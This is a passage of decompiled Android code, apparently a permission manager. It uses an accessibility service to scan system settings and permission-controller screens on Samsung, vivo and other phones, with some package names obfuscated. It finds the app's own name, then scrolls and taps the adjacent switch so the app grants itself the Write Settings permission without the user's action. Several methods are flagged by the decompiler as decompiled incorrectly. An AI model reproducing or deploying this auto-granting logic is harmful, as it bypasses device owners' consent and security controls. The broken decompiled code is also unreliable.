        if (!AbstractC0779a1.m213652a5(string, "ImageView", true) && !AbstractC0779a1.m213652a5(string, "Switch", true) && !AbstractC0779a1.m213652a5(string, "CheckBox", true) && !AbstractC0779a1.m213652a5(string, "Toggle", true)) {
            z = false;
        }
        if (z2 && z3 && z && rectM24a5.width() > 0) {
            arrayList.add(new Pair(accessibilityNodeInfo, rectM24a5));
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
            if (child != null) {
                m211703c8(i, i2, child, arrayList);
            }
        }
    }

    /* renamed from: d1 */
    public static AccessibilityNodeInfo m211704d1(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        int i;
        try {
            C0127ba c0127ba = new C0127ba();
            c0127ba.addLast(accessibilityNodeInfo);
            int i2 = -1;
            AccessibilityNodeInfo accessibilityNodeInfo2 = null;
            while (!c0127ba.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) c0127ba.removeFirst();
                CharSequence className = accessibilityNodeInfo3.getClassName();
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                if ((AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "Toggle", true) || AbstractC0779a1.m213652a5(string, "CompoundButton", true)) && accessibilityNodeInfo3.isVisibleToUser()) {
                    Rect rect = new Rect();
                    accessibilityNodeInfo3.getBoundsInScreen(rect);
                    if (!rect.isEmpty() && rect.width() > 0 && rect.height() > 0 && (i = rect.left) > i2) {
                        accessibilityNodeInfo2 = accessibilityNodeInfo3;
                        i2 = i;
                    }
                }
                int iMin = Math.min(accessibilityNodeInfo3.getChildCount(), 20);
                for (int i3 = 0; i3 < iMin; i3++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo3.getChild(i3);
                    if (child != null) {
                        c0127ba.addLast(child);
                    }
                }
            }
            return accessibilityNodeInfo2;
        } catch (Exception e) {
            tz0.m214807a7("findSwitchInParentHierarchy 异常: ", e.getMessage(), "WriteSettingsPerm");
            return null;
        }
    }

    /* renamed from: d2 */
    public static String m211705d2(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        String string3;
        try {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "unknown";
            }
            CharSequence text = accessibilityNodeInfo.getText();
            String str = "";
            if (text == null || (string2 = text.toString()) == null) {
                string2 = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription == null || (string3 = contentDescription.toString()) == null) {
                string3 = "";
            }
            String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
            if (viewIdResourceName != null) {
                str = viewIdResourceName;
            }
            return AbstractC0779a1.m213673c6(string + "_" + (rect.left + "," + rect.top + "," + rect.right + "," + rect.bottom) + "_" + string2 + "_" + string3 + "_" + str, " ", "_");
        } catch (Exception unused) {
            return tz0.m214803a3("unknown_control_", System.currentTimeMillis());
        }
    }

    /* renamed from: d3 */
    public static String m211706d3() throws IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        try {
            Object objInvoke = Class.forName(StringUtil.m212470a0("KlcVKEIxCGBYImVqCClZPQEeRT47XAMuRD0f")).getMethod("get", String.class).invoke(null, "ro.vivo.os.build.display.id");
            String str = objInvoke instanceof String ? (String) objInvoke : null;
            return str == null ? "" : str;
        } catch (Exception unused) {
            return "";
        }
    }

    /* renamed from: d8 */
    public static boolean m211707d8(String str) {
        List listM213306g5 = AbstractC0716jf.m213306g5("com.android.settings", "com.android.permissioncontroller", "com.google.android.permissioncontroller", StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), "com.samsung.android.lool");
        if (listM213306g5 == null || !listM213306g5.isEmpty()) {
            Iterator it = listM213306g5.iterator();
            while (it.hasNext()) {
                if (AbstractC0779a1.m213652a5(str, (String) it.next(), true)) {
                    break;
                }
            }
            if (!AbstractC0779a1.m213652a5(str, "permission", true) || AbstractC0779a1.m213652a5(str, "security", true) || AbstractC0779a1.m213652a5(str, "settings", true)) {
                break;
            }
            return false;
        }
        if (AbstractC0779a1.m213652a5(str, "permission", true)) {
        }
        return true;
    }

    /* renamed from: e0 */
    public static boolean m211708e0(String str) {
        Set setM210734f7 = AbstractC0134bh.m210734f7(new String[]{"com.android.settings", "com.android.systemui", "com.android.permissioncontroller", StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), StringUtil.m212470a0("KFYcdEIoHCEZIipfFA=="), StringUtil.m212470a0("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo="), "com.samsung.android.lool", "com.oneplus.security", StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI"), "com.transsion.permissionmanager", "com.meizu.safe", "com.smartisanos.security", "com.lenovo.safecenter"});
        if (setM210734f7 != null && setM210734f7.isEmpty()) {
            return false;
        }
        Iterator it = setM210734f7.iterator();
        while (it.hasNext()) {
            if (AbstractC0779a1.m213652a5(str, (String) it.next(), true)) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: e1 */
    public static boolean m211709e1(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        List listM213306g5 = AbstractC0716jf.m213306g5("Switch", "Toggle", "CheckBox", "RadioButton", "CompoundButton", "ToggleButton", "SwitchCompat");
        if (listM213306g5 != null && listM213306g5.isEmpty()) {
            return false;
        }
        Iterator it = listM213306g5.iterator();
        while (it.hasNext()) {
            if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                return accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isVisibleToUser() && accessibilityNodeInfo.isEnabled();
            }
        }
        return false;
    }

    /* JADX WARN: Removed duplicated region for block: B:15:0x002b  */
    /* renamed from: e2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m211710e2() {
        String lowerCase;
        boolean z;
        try {
            String str = Build.BRAND;
            if (str != null) {
                lowerCase = str.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            } else {
                lowerCase = "";
            }
            int i = Build.VERSION.SDK_INT;
            if (!AbstractC0779a1.m213652a5(lowerCase, "vivo", false)) {
                z = AbstractC0779a1.m213652a5(lowerCase, "iqoo", false);
            }
            return z && (i >= 35);
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 检测vivo Android 15设备失败", e);
            return false;
        }
    }

    /* renamed from: f4 */
    public static void m211711f4(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            try {
                accessibilityNodeInfo.recycle();
            } catch (Exception unused) {
            }
        }
    }

    /* renamed from: g0 */
    public static final void m211712g0(int i, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        if (i > 15) {
            return;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "ToggleButton", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false)) && accessibilityNodeInfo.isChecked()) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211712g0(i + 1, child, arrayList);
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:106:0x025e A[Catch: Exception -> 0x004f, TryCatch #0 {Exception -> 0x004f, blocks: (B:13:0x0040, B:49:0x0115, B:51:0x011d, B:53:0x0120, B:55:0x012e, B:58:0x013a, B:59:0x013e, B:61:0x0144, B:63:0x0152, B:65:0x0160, B:68:0x016a, B:70:0x0180, B:76:0x01ad, B:80:0x01d2, B:83:0x01e1, B:85:0x01e7, B:87:0x01ed, B:89:0x01f0, B:91:0x0214, B:95:0x021e, B:97:0x0224, B:101:0x0249, B:104:0x0258, B:106:0x025e, B:108:0x0264, B:110:0x0267, B:117:0x0281, B:121:0x02b9, B:128:0x02dd, B:132:0x0315, B:137:0x033b, B:19:0x0060, B:22:0x0070, B:25:0x0077, B:28:0x007e, B:31:0x0085, B:34:0x0098, B:37:0x00b5), top: B:142:0x0027 }] */
    /* JADX WARN: Removed duplicated region for block: B:108:0x0264 A[Catch: Exception -> 0x004f, TryCatch #0 {Exception -> 0x004f, blocks: (B:13:0x0040, B:49:0x0115, B:51:0x011d, B:53:0x0120, B:55:0x012e, B:58:0x013a, B:59:0x013e, B:61:0x0144, B:63:0x0152, B:65:0x0160, B:68:0x016a, B:70:0x0180, B:76:0x01ad, B:80:0x01d2, B:83:0x01e1, B:85:0x01e7, B:87:0x01ed, B:89:0x01f0, B:91:0x0214, B:95:0x021e, B:97:0x0224, B:101:0x0249, B:104:0x0258, B:106:0x025e, B:108:0x0264, B:110:0x0267, B:117:0x0281, B:121:0x02b9, B:128:0x02dd, B:132:0x0315, B:137:0x033b, B:19:0x0060, B:22:0x0070, B:25:0x0077, B:28:0x007e, B:31:0x0085, B:34:0x0098, B:37:0x00b5), top: B:142:0x0027 }] */
    /* JADX WARN: Removed duplicated region for block: B:135:0x032f  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x0115 A[Catch: Exception -> 0x004f, TRY_ENTER, TryCatch #0 {Exception -> 0x004f, blocks: (B:13:0x0040, B:49:0x0115, B:51:0x011d, B:53:0x0120, B:55:0x012e, B:58:0x013a, B:59:0x013e, B:61:0x0144, B:63:0x0152, B:65:0x0160, B:68:0x016a, B:70:0x0180, B:76:0x01ad, B:80:0x01d2, B:83:0x01e1, B:85:0x01e7, B:87:0x01ed, B:89:0x01f0, B:91:0x0214, B:95:0x021e, B:97:0x0224, B:101:0x0249, B:104:0x0258, B:106:0x025e, B:108:0x0264, B:110:0x0267, B:117:0x0281, B:121:0x02b9, B:128:0x02dd, B:132:0x0315, B:137:0x033b, B:19:0x0060, B:22:0x0070, B:25:0x0077, B:28:0x007e, B:31:0x0085, B:34:0x0098, B:37:0x00b5), top: B:142:0x0027 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x01e7 A[Catch: Exception -> 0x004f, TryCatch #0 {Exception -> 0x004f, blocks: (B:13:0x0040, B:49:0x0115, B:51:0x011d, B:53:0x0120, B:55:0x012e, B:58:0x013a, B:59:0x013e, B:61:0x0144, B:63:0x0152, B:65:0x0160, B:68:0x016a, B:70:0x0180, B:76:0x01ad, B:80:0x01d2, B:83:0x01e1, B:85:0x01e7, B:87:0x01ed, B:89:0x01f0, B:91:0x0214, B:95:0x021e, B:97:0x0224, B:101:0x0249, B:104:0x0258, B:106:0x025e, B:108:0x0264, B:110:0x0267, B:117:0x0281, B:121:0x02b9, B:128:0x02dd, B:132:0x0315, B:137:0x033b, B:19:0x0060, B:22:0x0070, B:25:0x0077, B:28:0x007e, B:31:0x0085, B:34:0x0098, B:37:0x00b5), top: B:142:0x0027 }] */
    /* JADX WARN: Removed duplicated region for block: B:87:0x01ed A[Catch: Exception -> 0x004f, TryCatch #0 {Exception -> 0x004f, blocks: (B:13:0x0040, B:49:0x0115, B:51:0x011d, B:53:0x0120, B:55:0x012e, B:58:0x013a, B:59:0x013e, B:61:0x0144, B:63:0x0152, B:65:0x0160, B:68:0x016a, B:70:0x0180, B:76:0x01ad, B:80:0x01d2, B:83:0x01e1, B:85:0x01e7, B:87:0x01ed, B:89:0x01f0, B:91:0x0214, B:95:0x021e, B:97:0x0224, B:101:0x0249, B:104:0x0258, B:106:0x025e, B:108:0x0264, B:110:0x0267, B:117:0x0281, B:121:0x02b9, B:128:0x02dd, B:132:0x0315, B:137:0x033b, B:19:0x0060, B:22:0x0070, B:25:0x0077, B:28:0x007e, B:31:0x0085, B:34:0x0098, B:37:0x00b5), top: B:142:0x0027 }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:122:0x02d1 -> B:15:0x0046). Please report as a decompilation issue!!! */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211713a2(ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$attemptClickSwitchByAppLabel$1 writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1;
        String string;
        boolean zM213652a5;
        DisplayMetrics displayMetrics;
        int i;
        int i2;
        C0327b2 c0327b2;
        int i3;
        int i4;
        int i5;
        boolean z;
        DisplayMetrics displayMetrics2;
        String str;
        C0327b2 c0327b22;
        C0327b2 c0327b23;
        C0327b2 c0327b24;
        int i6;
        int i7;
        int i8;
        String str2;
        boolean z2;
        C0327b2 c0327b25;
        DisplayMetrics displayMetrics3;
        AccessibilityNodeInfo accessibilityNodeInfo;
        Context context = this.f53167a1;
        if (continuationImpl instanceof WriteSettingsPermissionManager$attemptClickSwitchByAppLabel$1) {
            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1 = (WriteSettingsPermissionManager$attemptClickSwitchByAppLabel$1) continuationImpl;
            int i9 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9;
            if ((i9 & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = i9 - Integer.MIN_VALUE;
            } else {
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1 = new WriteSettingsPermissionManager$attemptClickSwitchByAppLabel$1(this, continuationImpl);
            }
        }
        Object obj = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52910a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        try {
        } catch (Exception e) {
            tz0.m214807a7("[应用名称定位] 异常: ", e.getMessage(), "WriteSettingsPerm");
        }
        switch (writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9) {
            case 0:
                kg1.m213544f4(obj);
                try {
                    PackageManager packageManager = context.getPackageManager();
                    ApplicationInfo applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 0);
                    t60.m214694b5(applicationInfo, "pm.getApplicationInfo(context.packageName, 0)");
                    string = packageManager.getApplicationLabel(applicationInfo).toString();
                } catch (Exception unused) {
                    string = context.getString(R$string.app_name);
                    t60.m214694b5(string, "{\n            context.ge…e) // 从资源获取默认名称\n        }");
                }
                String str3 = Build.BRAND;
                t60.m214694b5(str3, "BRAND");
                String lowerCase = str3.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                zM213652a5 = AbstractC0779a1.m213652a5(lowerCase, "samsung", false);
                displayMetrics = context.getResources().getDisplayMetrics();
                i = (int) (displayMetrics.density * 40);
                i2 = zM213652a5 ? 5 : 0;
                c0327b2 = this;
                i3 = 0;
                if (i3 <= i2) {
                    AccessibilityNodeInfo rootInActiveWindow = c0327b2.f53166a0.getRootInActiveWindow();
                    if (rootInActiveWindow == null) {
                        return Boolean.FALSE;
                    }
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(string);
                    if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                        C0327b2 c0327b26 = c0327b2;
                        if (!zM213652a5 || i3 >= i2) {
                            t60.m214726f4("WriteSettingsPerm", "[应用名称定位] 未找到包含'" + string + "'的节点");
                            return Boolean.FALSE;
                        }
                        int i10 = i3 + 1;
                        float f = displayMetrics.widthPixels / 2.0f;
                        float f2 = displayMetrics.heightPixels;
                        writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0 = c0327b26;
                        writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1 = string;
                        writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2 = displayMetrics;
                        writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52906a3 = zM213652a5;
                        writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52907a4 = i;
                        writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52908a5 = i10;
                        writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52909a6 = i2;
                        writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = 1;
                        WriteSettingsPermissionManager$attemptClickSwitchByAppLabel$1 writeSettingsPermissionManager$attemptClickSwitchByAppLabel$12 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1;
                        if (c0327b26.m211748f3(f, f2 * 0.7f, f, f2 * 0.3f, writeSettingsPermissionManager$attemptClickSwitchByAppLabel$12) != coroutineSingletons) {
                            displayMetrics2 = displayMetrics;
                            i4 = i2;
                            z = zM213652a5;
                            i5 = i10;
                            str = string;
                            c0327b22 = c0327b26;
                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$12;
                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0 = c0327b22;
                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1 = str;
                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2 = displayMetrics2;
                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52906a3 = z;
                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52907a4 = i;
                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52908a5 = i5;
                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52909a6 = i4;
                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = 2;
                            if (b81.m210571b1(600L, writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1) != coroutineSingletons) {
                                boolean z3 = z;
                                i2 = i4;
                                displayMetrics = displayMetrics2;
                                i3 = i5;
                                zM213652a5 = z3;
                                string = str;
                                c0327b2 = c0327b22;
                                if (i3 <= i2) {
                                }
                            }
                        }
                    } else {
                        Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByText.iterator();
                        while (true) {
                            if (it.hasNext()) {
                                AccessibilityNodeInfo next = it.next();
                                if (next.isVisibleToUser()) {
                                    Rect rect = new Rect();
                                    next.getBoundsInScreen(rect);
                                    int iCenterY = rect.centerY();
                                    if (zM213652a5) {
                                        AccessibilityNodeInfo rootInActiveWindow2 = c0327b2.f53166a0.getRootInActiveWindow();
                                        if (rootInActiveWindow2 == null) {
                                            continue;
                                        } else {
                                            ArrayList arrayListM211699b7 = m211699b7(rootInActiveWindow2);
                                            int size = arrayListM211699b7.size();
                                            int i11 = Integer.MAX_VALUE;
                                            accessibilityNodeInfo = next;
                                            AccessibilityNodeInfo accessibilityNodeInfo2 = null;
                                            int i12 = 0;
                                            while (i12 < size) {
                                                Object obj2 = arrayListM211699b7.get(i12);
                                                i12++;
                                                int i13 = size;
                                                AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj2;
                                                ArrayList arrayList = arrayListM211699b7;
                                                Rect rect2 = new Rect();
                                                accessibilityNodeInfo3.getBoundsInScreen(rect2);
                                                int iAbs = Math.abs(rect2.centerY() - iCenterY);
                                                if (iAbs < i && iAbs < i11) {
                                                    accessibilityNodeInfo2 = accessibilityNodeInfo3;
                                                    i11 = iAbs;
                                                }
                                                arrayListM211699b7 = arrayList;
                                                size = i13;
                                            }
                                            if (accessibilityNodeInfo2 != null) {
                                                Rect rect3 = new Rect();
                                                accessibilityNodeInfo2.getBoundsInScreen(rect3);
                                                float fCenterX = rect3.centerX();
                                                float fCenterY = rect3.centerY();
                                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0 = c0327b2;
                                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1 = null;
                                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2 = null;
                                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = 3;
                                                if (c0327b2.m211747f2(fCenterX, fCenterY, writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1) != coroutineSingletons) {
                                                    c0327b23 = c0327b2;
                                                    break;
                                                }
                                            } else {
                                                t60.m214726f4("WriteSettingsPerm", "[三星专用] ⚠️ 未找到'" + string + "'同一行的开关 (阈值=" + i + "px)");
                                            }
                                        }
                                    } else {
                                        accessibilityNodeInfo = next;
                                    }
                                    AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                                    for (int i14 = 0; parent != null && i14 < 5; i14++) {
                                        AccessibilityNodeInfo accessibilityNodeInfoM211732d0 = c0327b2.m211732d0(parent);
                                        if (accessibilityNodeInfoM211732d0 != null) {
                                            Rect rect4 = new Rect();
                                            accessibilityNodeInfoM211732d0.getBoundsInScreen(rect4);
                                            float fCenterX2 = rect4.centerX();
                                            float fCenterY2 = rect4.centerY();
                                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0 = c0327b2;
                                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1 = null;
                                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2 = null;
                                            writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = 5;
                                            if (c0327b2.m211747f2(fCenterX2, fCenterY2, writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1) != coroutineSingletons) {
                                                c0327b24 = c0327b2;
                                                break;
                                            }
                                        } else {
                                            parent = parent.getParent();
                                        }
                                    }
                                }
                            } else if (zM213652a5 && i3 < i2) {
                                int i15 = i3 + 1;
                                float f3 = displayMetrics.widthPixels / 2.0f;
                                float f4 = displayMetrics.heightPixels;
                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0 = c0327b2;
                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1 = string;
                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2 = displayMetrics;
                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52906a3 = zM213652a5;
                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52907a4 = i;
                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52908a5 = i15;
                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52909a6 = i2;
                                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = 7;
                                C0327b2 c0327b27 = c0327b2;
                                if (c0327b27.m211748f3(f3, f4 * 0.7f, f3, f4 * 0.3f, writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1) != coroutineSingletons) {
                                    displayMetrics3 = displayMetrics;
                                    z2 = zM213652a5;
                                    i6 = i2;
                                    i7 = i15;
                                    c0327b25 = c0327b27;
                                    i8 = i;
                                    str2 = string;
                                    break;
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                }
                return Boolean.FALSE;
            case 1:
                i4 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52909a6;
                i5 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52908a5;
                i = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52907a4;
                z = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52906a3;
                displayMetrics2 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2;
                str = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1;
                c0327b22 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0;
                kg1.m213544f4(obj);
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0 = c0327b22;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1 = str;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2 = displayMetrics2;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52906a3 = z;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52907a4 = i;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52908a5 = i5;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52909a6 = i4;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = 2;
                if (b81.m210571b1(600L, writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                int i16 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52909a6;
                int i17 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52908a5;
                i = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52907a4;
                boolean z4 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52906a3;
                DisplayMetrics displayMetrics4 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2;
                String str4 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1;
                C0327b2 c0327b28 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0;
                kg1.m213544f4(obj);
                i2 = i16;
                displayMetrics = displayMetrics4;
                i3 = i17;
                zM213652a5 = z4;
                string = str4;
                c0327b2 = c0327b28;
                if (i3 <= i2) {
                }
                return Boolean.FALSE;
            case 3:
                c0327b23 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0;
                kg1.m213544f4(obj);
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0 = c0327b23;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = 4;
                if (b81.m210571b1(800L, writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (c0327b23.m211734d5()) {
                    return Boolean.TRUE;
                }
                c0327b23.m211738e3();
                return Boolean.TRUE;
            case 4:
                c0327b23 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0;
                kg1.m213544f4(obj);
                if (c0327b23.m211734d5()) {
                }
                break;
            case 5:
                c0327b24 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0;
                kg1.m213544f4(obj);
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0 = c0327b24;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = 6;
                if (b81.m210571b1(800L, writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (c0327b24.m211734d5()) {
                    return Boolean.TRUE;
                }
                c0327b24.m211738e3();
                return Boolean.TRUE;
            case 6:
                c0327b24 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0;
                kg1.m213544f4(obj);
                if (c0327b24.m211734d5()) {
                }
                break;
            case 7:
                i6 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52909a6;
                i7 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52908a5;
                int i18 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52907a4;
                boolean z5 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52906a3;
                DisplayMetrics displayMetrics5 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2;
                String str5 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1;
                C0327b2 c0327b29 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0;
                kg1.m213544f4(obj);
                i8 = i18;
                str2 = str5;
                z2 = z5;
                c0327b25 = c0327b29;
                displayMetrics3 = displayMetrics5;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52903a0 = c0327b25;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52904a1 = str2;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52905a2 = displayMetrics3;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52906a3 = z2;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52907a4 = i8;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52908a5 = i7;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52909a6 = i6;
                writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52912a9 = 8;
                if (b81.m210571b1(600L, writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                string = str2;
                i = i8;
                i3 = i7;
                zM213652a5 = z2;
                c0327b2 = c0327b25;
                i2 = i6;
                displayMetrics = displayMetrics3;
                if (i3 <= i2) {
                }
                return Boolean.FALSE;
            case 8:
                i6 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52909a6;
                i7 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52908a5;
                i8 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52907a4;
                z2 = writeSettingsPermissionManager$attemptClickSwitchByAppLabel$1.f52906a3;
